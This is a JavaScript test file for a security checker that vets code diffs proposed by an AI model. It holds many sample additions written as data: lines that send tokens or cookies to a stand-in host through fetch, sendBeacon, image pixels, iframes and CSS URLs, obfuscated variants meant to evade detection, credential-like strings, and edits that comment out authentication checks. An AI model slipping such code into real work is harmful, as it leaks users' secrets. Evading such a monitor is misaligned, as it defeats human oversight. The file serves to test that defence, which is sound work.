import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { MODEL_ALLOWED_PATH } from '../aieo/lib/model-provider.mjs';
import { inspectModelDiff } from './aieo-model-security.mjs';

const hash = (value) => createHash('sha256').update(value).digest('hex');
const original = 'const items = 1;\n';
const actual = 'const items = 2;\n';
const report = { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) };
const diff = '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n';
const input = { original, actual, changedPaths: [MODEL_ALLOWED_PATH], diff, report };

test('independent security accepts one exact clean change', () => {
  assert.equal(inspectModelDiff(input).status, 'passed');
});
test('security blocks changed-file scope and hash tampering', () => {
  assert.equal(inspectModelDiff({ ...input, changedPaths: ['supabase/config.toml'] }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, changedPaths: [MODEL_ALLOWED_PATH, 'package.json'] }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, report: { ...report, proposedHash: 'wrong' } }).status, 'failed');
});
test('security blocks suspicious newly introduced calls and credentials', () => {
  assert.equal(inspectModelDiff({ ...input, diff: '+fetch("https://example.invalid")' }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, diff: '+ghp_' + 'a'.repeat(30) }).status, 'failed');
});
test('security blocks no-op and massive diffs', () => {
  assert.equal(inspectModelDiff({ ...input, actual: original }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, diff: '+safe\n'.repeat(25) }).status, 'failed');
});

test('security rejects browser exfiltration primitives and modern credentials', () => {
  for (const addition of [
    '+const raw = document.cookie;',
    '+localStorage.getItem("token");',
    '+new WebSocket("wss://example.invalid");',
    '+<div dangerouslySetInnerHTML={{ __html: message }} />;',
    '+import { execSync } from "child_process";',
    '+sk-or-v1-' + 'a'.repeat(40),
    '+github_pat_' + 'b'.repeat(40),
    '+Bearer ' + 'c'.repeat(36)
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security rejects browser side-channel exfiltration and navigation additions', () => {
  for (const addition of [
    '+window.open("https://example.invalid/?data=" + token);',
    '+navigator["sendBeacon"]("https://example.invalid", body);',
    '+const pixel = new Image();',
    '+location.assign("https://example.invalid");',
    '+window.location.href = "https://example.invalid";',
    '+document.createElement("iframe");',
    '+globalThis["fetch"]("https://example.invalid");'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security rejects newly added outbound markup and CSS, including multiline JSX', () => {
  for (const addition of [
    '+<img src={unsafeUrl} />',
    '+<a href={unsafeUrl}>Open</a>',
    '+<form action={unsafeUrl}>Send</form>',
    '+<iframe\n+ src={unsafeUrl} />',
    '+const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security refuses removal of existing feedback authentication and ownership guards', () => {
  const protectedSource = [
    'const auth = await supabase.auth.getUser();',
    'if (!auth.user) return;',
    'const record = { created_by: auth.user.id };',
    'await supabase.from("feedback").insert(record);',
    ''
  ].join('\n');
  const variants = [
    protectedSource.replace('if (!auth.user)', 'if (true)'),
    protectedSource.replace('created_by: auth.user.id', 'created_by: null'),
    protectedSource.replace('await supabase.auth.getUser()', 'Promise.resolve(null)')
  ];
  for (const current of variants) {
    const evidence = {
      status: 'proposed', sourceHash: hash(protectedSource), proposedHash: hash(current)
    };
    const result = inspectModelDiff({
      original: protectedSource, actual: current, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n+const safe = 1;\n', report: evidence
    });
    assert.equal(result.status, 'failed');
    assert.ok(result.findings.some((value) => value.includes('authentication or ownership')));
  }
});

test('security freezes submit handler against comment-only auth bypass while allowing UI text edits', () => {
  const base = [
    'export default function FeedbackWidget() {',
    '  async function submit(event: FormEvent<HTMLFormElement>) {',
    '    const { data: auth } = await supabase.auth.getUser();',
    '    if (!auth.user) { return; }',
    '    await supabase.from("feedback").insert({ created_by: auth.user.id });',
    '  }',
    '  return <>',
    '    <form onSubmit={submit}><span>Old label</span></form>',
    '  </>;',
    '}',
    ''
  ].join(String.fromCharCode(10));
  const assess = (actual, diff) => inspectModelDiff({
    original: base, actual, changedPaths: [MODEL_ALLOWED_PATH], diff,
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(actual) }
  });
  const safe = base.replace('Old label', 'New label');
  assert.equal(assess(safe, '+    <form onSubmit={submit}><span>New label</span></form>').status, 'passed');
  // The old substring-only guard accepted commented-out auth checks.
  const commented = base.replace('    if (!auth.user)', '    // if (!auth.user)');
  const commentResult = assess(commented, '+    // if (!auth.user) { return; }');
  assert.equal(commentResult.status, 'failed');
  assert.ok(commentResult.findings.some((finding) => finding.includes('submit handler')));
  const reassigned = base.replace('<form onSubmit={submit}>', '<form onSubmit={() => {}}>');
  assert.equal(assess(reassigned, '+    <form onSubmit={() => {}}><span>Old label</span></form>').status, 'failed');
  const blockComment = base.replace('    if (!auth.user)', '    /* if (!auth.user)');
  assert.equal(assess(blockComment, '+    /* if (!auth.user) { return; }').status, 'failed');
});


test('independent Security rejects optional chaining and indirect browser API additions', () => {
  for (const addition of [
    "fetch?.(\"https://example.invalid/?key=\" + token);",
    "navigator?.sendBeacon?.(\"https://example.invalid\", token);",
    "window?.[\"open\"]?.(\"https://example.invalid\");",
    "globalThis[\"fe\" + \"tch\"](\"https://example.invalid\");",
    "const send = navigator.sendBeacon.bind(navigator);",
    "const forward = fetch; forward(\"https://example.invalid\");",
    "const transport = new WebTransport(\"https://example.invalid\");",
    "const stream = new EventSource(\"https://example.invalid\");",
    "const access = location?.assign;",
    "self[\"fetch\"](\"https://example.invalid\");",
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: '+ ' + addition }).status, 'failed', addition);
  }
});

test('independent Security rejects new HTML navigation, form, SVG and media transfer attributes', () => {
  for (const addition of [
    '+<iframe srcDoc={untrustedMarkup} />',
    '+<button formAction="https://example.invalid/collect">Send</button>',
    '+<input type="image" src="https://example.invalid/pixel" />',
    '+<a ping="https://example.invalid/track">Open</a>',
    '+<svg><image href="https://example.invalid/pixel" /></svg>',
    '+<svg><use xlink:href="https://example.invalid/asset" /></svg>',
    '+<video poster="https://example.invalid/pixel" />',
    '+<meta httpEquiv="refresh" content="0;url=https://example.invalid/" />',
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('independent Security rejects CSS imports and image-set URLs without fetch calls', () => {
  for (const addition of [
    '+const css = `@import "https://example.invalid/style.css";`;',
    '+const css = `background: image-set("https://example.invalid/pixel" 1x);`;',
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});
